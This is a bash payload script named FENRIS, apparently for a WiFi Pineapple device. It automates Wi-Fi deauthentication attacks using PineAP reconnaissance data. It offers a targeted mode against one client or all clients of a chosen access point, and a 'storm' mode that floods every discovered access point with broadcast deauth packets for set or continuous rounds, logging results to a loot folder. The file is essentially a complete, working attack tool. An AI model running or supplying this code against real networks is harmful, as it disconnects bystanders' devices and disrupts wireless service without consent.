#!/bin/bash
# Title: FENRIS - Deauth Storm
# Description: Automated deauthentication attacks using PineAP recon data
# Author: HaleHound
# Version: 1.1.0
# Category: user/attack
#
# Named after the monstrous wolf who breaks free from his chains
# FENRIS tears clients away from their access points
#
# Uses PINEAPPLE_DEAUTH_CLIENT command for targeted deauth attacks
# Integrates with HUGINN recon data for intelligent target selection

# === CONFIGURATION ===
LOOTDIR="/root/loot/fenris"
INPUT=/dev/input/event0

# Deauth settings
DEFAULT_BURST_COUNT=50       # Deauth packets per burst
DEFAULT_BURST_DELAY=2        # Seconds between bursts
MAX_TARGETS=20               # Maximum concurrent targets

# Active log file (set during attack)
ACTIVE_LOG=""

# === LOGGING HELPER ===
# Writes to both display AND log file
logboth() {
    local msg="$1"
    LOG "$msg"
    [ -n "$ACTIVE_LOG" ] && echo "$msg" >> "$ACTIVE_LOG"
}

# === CLEANUP ===
cleanup() {
    pkill -9 -f "fenris_deauth" 2>/dev/null
    rm -f /tmp/fenris_running /tmp/fenris_targets /tmp/fenris_status
    LED WHITE
}

trap cleanup EXIT INT TERM

# === LED PATTERNS ===
led_scanning() {
    LED CYAN
}

led_targeting() {
    LED AMBER
}

led_attacking() {
    LED RED
}

led_success() {
    LED GREEN
}

led_error() {
    LED MAGENTA
}

# === SOUNDS ===
play_start() {
    RINGTONE "start:d=4,o=4,b=200:g,a,b,c5" &
}

play_attack() {
    RINGTONE "atk:d=16,o=5,b=240:c,e,g" &
}

play_complete() {
    RINGTONE "done:d=4,o=5,b=180:g,e,c" &
}

play_fail() {
    RINGTONE "fail:d=4,o=4,b=120:g,e,c" &
}

# === CHECK FOR BUTTON PRESS ===
check_for_stop() {
    local data=$(timeout 0.1 dd if=$INPUT bs=16 count=1 2>/dev/null | hexdump -e '16/1 "%02x "' 2>/dev/null)
    [ -z "$data" ] && return 1

    local evtype=$(echo "$data" | cut -d' ' -f9-10)
    local evvalue=$(echo "$data" | cut -d' ' -f13)

    if [ "$evtype" = "01 00" ] && [ "$evvalue" = "01" ]; then
        return 0
    fi
    return 1
}

# === TARGET DATA ===
declare -a AP_MACS
declare -a AP_SSIDS
declare -a AP_CHANNELS
declare -a CLIENT_MACS
declare -a CLIENT_AP_MACS
declare -a CLIENT_CHANNELS
declare -a SEL_CLIENTS
CSELECTED=0
SELECTED=0
TOTAL_APS=0
TOTAL_CLIENTS=0

# === SCAN FUNCTIONS ===

# recon_records: split a PineAP RECON JSON array into one top-level object per line.
# Brace-depth aware and string-safe, so the nested beacon[]/response[] arrays inside an AP
# record stay with their own AP. Fields must be read per record: the previous code ran one
# grep per field over the whole document and paired them by array position, so a single AP
# with two beacon entries shifted every later SSID *and channel* by one, and FENRIS would
# then transmit against the wrong BSSID on the wrong channel.
recon_records() {
    awk '{
        n = length($0)
        for (i = 1; i <= n; i++) {
            c = substr($0, i, 1)
            if (instr) {
                rec = rec c
                if (esc)            { esc = 0 }
                else if (c == "\\") { esc = 1 }
                else if (c == "\"") { instr = 0 }
                continue
            }
            if (c == "\"") { instr = 1; rec = rec c; continue }
            if (c == "{")  { depth++; rec = rec c; continue }
            if (c == "}")  { depth--; rec = rec c; if (depth == 0) { print rec; rec = "" }; continue }
            if (depth > 0) rec = rec c
        }
    }'
}

# json_str <record> <key> -> first string value for that key within this record
json_str() { printf '%s' "$1" | grep -o "\"$2\":\"[^\"]*\"" | head -1 | sed "s/^\"$2\":\"//; s/\"\$//"; }
# json_num <record> <key> -> first numeric value for that key within this record
json_num() { printf '%s' "$1" | grep -o "\"$2\":[0-9]*" | head -1 | sed "s/^\"$2\"://"; }

scan_access_points() {
    LOG "Scanning for access points..."
    led_scanning

    local json rec mac ssid ch
    json=$(_pineap RECON APS limit=30 format=json)

    AP_MACS=()
    AP_SSIDS=()
    AP_CHANNELS=()

    while IFS= read -r rec; do
        mac=$(json_str "$rec" mac)
        [ -n "$mac" ] || continue
        ssid=$(json_str "$rec" ssid)
        ch=$(json_num "$rec" channel)
        [ -z "$ssid" ] && ssid="[Hidden]"
        AP_MACS+=("$mac")
        AP_SSIDS+=("$ssid")
        AP_CHANNELS+=("${ch:-0}")
    done < <(printf '%s' "$json" | recon_records)

    TOTAL_APS=${#AP_MACS[@]}

    if [ $TOTAL_APS -eq 0 ]; then
        LOG "No access points found"
        LOG "Start Recon first"
        return 1
    fi
    LOG "Found $TOTAL_APS access points"
    return 0
}

scan_clients() {
    LOG "Scanning for clients..."
    led_scanning

    local json rec mac ap ch
    json=$(_pineap RECON CLIENTS limit=50 format=json)

    CLIENT_MACS=()
    CLIENT_AP_MACS=()
    CLIENT_CHANNELS=()

    while IFS= read -r rec; do
        mac=$(json_str "$rec" mac)
        [ -n "$mac" ] || continue
        ap=$(json_str "$rec" ap_mac)
        ch=$(json_num "$rec" channel)
        CLIENT_MACS+=("$mac")
        CLIENT_AP_MACS+=("${ap:--}")
        CLIENT_CHANNELS+=("${ch:-0}")
    done < <(printf '%s' "$json" | recon_records)

    TOTAL_CLIENTS=${#CLIENT_MACS[@]}

    if [ $TOTAL_CLIENTS -eq 0 ]; then
        LOG "No clients found"
        return 1
    fi
    LOG "Found $TOTAL_CLIENTS clients"
    return 0
}

# === TARGET SELECTION UI ===
show_ap_target() {
    LOG ""
    LOG "[$((SELECTED + 1))/$TOTAL_APS] ${AP_SSIDS[$SELECTED]}"
    LOG "${AP_MACS[$SELECTED]}"
    LOG "Channel: ${AP_CHANNELS[$SELECTED]}"
    LOG ""
    LOG "UP/DOWN=Scroll A=Select B=Back"
}

select_ap_target() {
    SELECTED=0
    show_ap_target

    while true; do
        local btn=$(WAIT_FOR_INPUT)
        case "$btn" in
            UP|LEFT)
                SELECTED=$((SELECTED - 1))
                [ $SELECTED -lt 0 ] && SELECTED=$((TOTAL_APS - 1))
                show_ap_target
                ;;
            DOWN|RIGHT)
                SELECTED=$((SELECTED + 1))
                [ $SELECTED -ge $TOTAL_APS ] && SELECTED=0
                show_ap_target
                ;;
            A)
                return 0
                ;;
            B|BACK)
                return 1
                ;;
        esac
    done
}

# filter_clients_for_ap <bssid> -> SEL_CLIENTS (indices into CLIENT_MACS); rc 1 when none
filter_clients_for_ap() {
    local ap="${1,,}" i
    SEL_CLIENTS=()
    for i in "${!CLIENT_MACS[@]}"; do
        [ "${CLIENT_AP_MACS[$i],,}" = "$ap" ] && SEL_CLIENTS+=("$i")
    done
    [ ${#SEL_CLIENTS[@]} -gt 0 ]
}

show_client_target() {
    local i="${SEL_CLIENTS[$CSELECTED]}"
    LOG ""
    LOG "[$((CSELECTED + 1))/${#SEL_CLIENTS[@]}] ${CLIENT_MACS[$i]}"
    LOG "on ${CLIENT_AP_MACS[$i]}"
    LOG ""
    LOG "UP/DOWN=Scroll A=This one B=All clients"
}

select_client_target() {
    CSELECTED=0
    show_client_target

    while true; do
        local btn=$(WAIT_FOR_INPUT)
        case "$btn" in
            UP|LEFT)
                CSELECTED=$((CSELECTED - 1))
                [ $CSELECTED -lt 0 ] && CSELECTED=$(( ${#SEL_CLIENTS[@]} - 1 ))
                show_client_target
                ;;
            DOWN|RIGHT)
                CSELECTED=$((CSELECTED + 1))
                [ $CSELECTED -ge ${#SEL_CLIENTS[@]} ] && CSELECTED=0
                show_client_target
                ;;
            A)
                return 0
                ;;
            B|BACK)
                return 1
                ;;
        esac
    done
}

# === DEAUTH ATTACK FUNCTIONS ===

# Single target deauth (one client from one AP)
deauth_single_client() {
    local ap_mac=$1
    local client_mac=$2
    local channel=$3
    local count=$4

    LOG "Deauthing $client_mac from $ap_mac (ch$channel)"

    local i=0
    while [ $i -lt $count ]; do
        if check_for_stop; then
            return 1
        fi

        # Use verified PINEAPPLE_DEAUTH_CLIENT command
        PINEAPPLE_DEAUTH_CLIENT "$ap_mac" "$client_mac" "$channel"

        i=$((i + 1))

        # Brief pause between packets
        sleep 0.1
    done

    return 0
}

# Broadcast deauth (all clients from one AP)
deauth_broadcast() {
    local ap_mac=$1
    local channel=$2
    local count=$3

    LOG "Broadcast deauth on $ap_mac (ch$channel)"

    local i=0
    while [ $i -lt $count ]; do
        if check_for_stop; then
            return 1
        fi

        # FF:FF:FF:FF:FF:FF = broadcast (all clients)
        PINEAPPLE_DEAUTH_CLIENT "$ap_mac" "FF:FF:FF:FF:FF:FF" "$channel"

        i=$((i + 1))
        sleep 0.1
    done

    return 0
}

# === ATTACK MODES ===

# Mode 1: Targeted single client
attack_targeted() {
    LOG ""
    LOG "=== TARGETED DEAUTH ==="
    LOG ""

    # First select the AP
    if ! scan_access_points; then
        ERROR_DIALOG "No APs found\n\nRun Recon first"
        return 1
    fi

    if ! select_ap_target; then
        LOG "Cancelled"
        return 1
    fi

    local target_ap="${AP_MACS[$SELECTED]}"
    local target_ssid="${AP_SSIDS[$SELECTED]}"
    local target_channel="${AP_CHANNELS[$SELECTED]}"

    LOG ""
    LOG "Target AP: $target_ssid"
    LOG "MAC: $target_ap"
    LOG "Channel: $target_channel"
    LOG ""

    # Offer one client on this AP. B at the picker falls back to the AP-wide broadcast, which is
    # what this mode did unconditionally while deauth_single_client sat unreachable.
    local target_client=""
    if scan_clients && filter_clients_for_ap "$target_ap"; then
        LOG "${#SEL_CLIENTS[@]} client(s) on $target_ssid"
        if select_client_target; then
            target_client="${CLIENT_MACS[${SEL_CLIENTS[$CSELECTED]}]}"
            LOG "Target client: $target_client"
        else
            LOG "All clients (broadcast)"
        fi
    else
        LOG "No clients listed for this AP"
        LOG "Broadcast only"
    fi

    # Get burst count
    local burst_count=$(NUMBER_PICKER "Deauth packets per burst" $DEFAULT_BURST_COUNT)
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    # Get number of bursts
    local num_bursts=$(NUMBER_PICKER "Number of bursts (0=continuous)" 10)
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    local scope="ALL clients on"
    [ -n "$target_client" ] && scope="${target_client} on"
    local confirm=$(CONFIRMATION_DIALOG "Attack $scope:\n$target_ssid\n\n$burst_count pkts x $num_bursts bursts")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    if [ "$confirm" != "1" ]; then
        LOG "Cancelled by user"
        return 0
    fi

    # Execute attack
    execute_deauth_storm "$target_ap" "$target_channel" "$burst_count" "$num_bursts" "$target_ssid" "$target_client"
}

# Mode 2: Multi-AP storm (all discovered APs)
attack_storm() {
    LOG ""
    LOG "=== DEAUTH STORM ==="
    LOG "Attacking ALL discovered APs"
    LOG ""

    if ! scan_access_points; then
        ERROR_DIALOG "No APs found\n\nRun Recon first"
        return 1
    fi

    LOG "Targets: $TOTAL_APS access points"

    # Get burst count
    local burst_count=$(NUMBER_PICKER "Deauth packets per target" $DEFAULT_BURST_COUNT)
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    # Get rounds
    local rounds=$(NUMBER_PICKER "Attack rounds (0=continuous)" 5)
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    local confirm=$(CONFIRMATION_DIALOG "DEAUTH STORM\n\nTargets: $TOTAL_APS APs\nPackets: $burst_count each\nRounds: $rounds\n\nThis is LOUD!")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            LOG "Cancelled"
            return 1
            ;;
    esac

    if [ "$confirm" != "1" ]; then
        LOG "Cancelled by user"
        return 0
    fi

    # Execute storm
    led_attacking
    play_start
    VIBRATE

    mkdir -p "$LOOTDIR"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local logfile="$LOOTDIR/storm_${timestamp}.log"
    ACTIVE_LOG="$logfile"

    logboth ""
    logboth "=== FENRIS UNLEASHED ==="
    logboth "Started: $(date)"
    logboth "Targets: $TOTAL_APS"
    logboth ""

    local round=1
    local continuous=false
    [ "$rounds" -eq 0 ] && continuous=true

    local total_deauths=0
    local stopped=false

    while [ $continuous = true ] || [ $round -le $rounds ]; do
        if [ $stopped = true ]; then
            break
        fi

        logboth ""
        logboth "--- Round $round ---"

        local ap_idx=0
        while [ $ap_idx -lt $TOTAL_APS ]; do
            if check_for_stop; then
                logboth "User stopped attack"
                stopped=true
                break
            fi

            local ap="${AP_MACS[$ap_idx]}"
            local ch="${AP_CHANNELS[$ap_idx]}"
            local ssid="${AP_SSIDS[$ap_idx]}"

            logboth "[$((ap_idx + 1))/$TOTAL_APS] $ssid (ch$ch)"
            play_attack

            if deauth_broadcast "$ap" "$ch" "$burst_count"; then
                total_deauths=$((total_deauths + burst_count))
            else
                stopped=true
                break
            fi

            ap_idx=$((ap_idx + 1))
            sleep "$DEFAULT_BURST_DELAY"
        done

        round=$((round + 1))
    done

    # Results
    logboth ""
    logboth "=== STORM COMPLETE ==="
    logboth "Rounds: $((round - 1))"
    logboth "Total deauths: $total_deauths"
    logboth "Ended: $(date)"

    led_success
    play_complete
    VIBRATE
    VIBRATE

    ALERT "FENRIS COMPLETE\n\nRounds: $((round - 1))\nDeauth packets: $total_deauths\n\nLog: $logfile"
}

# Execute a single-AP attack. With a client MAC it is a unicast deauth of that one client via
# deauth_single_client; without one it is the AP-wide broadcast.
execute_deauth_storm() {
    local ap_mac=$1
    local channel=$2
    local burst_count=$3
    local num_bursts=$4
    local ssid=$5
    local client=${6:-}

    led_attacking
    play_start
    VIBRATE

    mkdir -p "$LOOTDIR"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local logfile="$LOOTDIR/deauth_${timestamp}.log"
    ACTIVE_LOG="$logfile"

    logboth ""
    logboth "=== FENRIS ATTACK ==="
    logboth "Target: $ssid"
    logboth "AP MAC: $ap_mac"
    logboth "Client: ${client:-all (broadcast)}"
    logboth "Channel: $channel"
    logboth "Started: $(date)"
    logboth ""
    logboth "Press A to stop"
    logboth ""

    local burst=1
    local continuous=false
    [ "$num_bursts" -eq 0 ] && continuous=true

    local total_deauths=0
    local stopped=false

    while [ $continuous = true ] || [ $burst -le $num_bursts ]; do
        if check_for_stop; then
            logboth "User stopped attack"
            stopped=true
            break
        fi

        logboth "Burst $burst: Sending $burst_count deauths..."
        play_attack

        if { [ -n "$client" ] && deauth_single_client "$ap_mac" "$client" "$channel" "$burst_count"; } \
           || { [ -z "$client" ] && deauth_broadcast "$ap_mac" "$channel" "$burst_count"; }; then
            total_deauths=$((total_deauths + burst_count))
            logboth "  Sent: $total_deauths total"
        else
            stopped=true
            break
        fi

        burst=$((burst + 1))

        if [ $continuous = true ] || [ $burst -le $num_bursts ]; then
            sleep "$DEFAULT_BURST_DELAY"
        fi
    done

    # Results
    logboth ""
    logboth "=== ATTACK COMPLETE ==="
    logboth "Bursts: $((burst - 1))"
    logboth "Total deauths: $total_deauths"
    logboth "Ended: $(date)"

    led_success
    play_complete
    VIBRATE
    VIBRATE

    ALERT "FENRIS COMPLETE\n\nTarget: $ssid\nBursts: $((burst - 1))\nDeauth packets: $total_deauths\n\nLog: $logfile"
}

# === MAIN ===

LOG ""
LOG " ___ ___ _  _ ___ ___ ___  "
LOG "| __| __| \\| | _ \\_ _/ __| "
LOG "| _|| _|| .\` |   /| |\\__ \\ "
LOG "|_| |___|_|\\_|_|_\\___|___/ "
LOG ""
LOG "    Deauth Storm v1.0"
LOG ""
LOG "The wolf breaks free from chains"
LOG ""

mkdir -p "$LOOTDIR"

# Mode selection - PROMPT + NUMBER_PICKER pattern
PROMPT "ATTACK MODE:

1. Targeted (single AP)
2. Storm (ALL APs)

Press OK then enter number."

mode_choice=$(NUMBER_PICKER "Select mode (1-2)" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Cancelled"
        exit 1
        ;;
esac

[ -z "$mode_choice" ] && mode_choice=1

case $mode_choice in
    1)
        attack_targeted
        ;;
    2)
        attack_storm
        ;;
    *)
        LOG "Invalid mode"
        exit 1
        ;;
esac

LED WHITE
LOG ""
LOG "FENRIS payload complete"
